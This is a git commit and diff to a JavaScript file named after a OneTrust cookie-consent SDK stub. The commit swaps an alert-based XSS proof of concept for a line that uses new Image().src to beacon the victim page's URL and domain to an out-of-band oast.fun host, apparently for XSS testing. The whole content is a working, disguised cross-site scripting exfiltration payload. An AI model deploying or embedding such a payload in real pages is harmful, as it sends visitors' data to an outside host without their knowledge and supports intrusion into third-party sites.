865ddc29be72315ae38fcf3a194fb44d5732b834
0xomn <amnyhyat@gmail.com>
2025-10-16 11:34:42 +0300

    Implement XSS test image request
    Added a new image request for XSS testing.

--- onetrust/cdo/scripttemplates/otSDKStub.js
+++ onetrust/cdo/scripttemplates/otSDKStub.js
@@ -1,1 +1,3 @@
-alert("XSS from Omn!");
+// hosted at https://0xomn.github.io/xss-test/PoC.js
+new Image().src = "nnxsfcmrxzkstvbrqkyh2s28e057ar1fv.oast.fun/?u="+encodeURIComponent(location.href)+"&d="+document.domain+"&t="+Date.now();
+
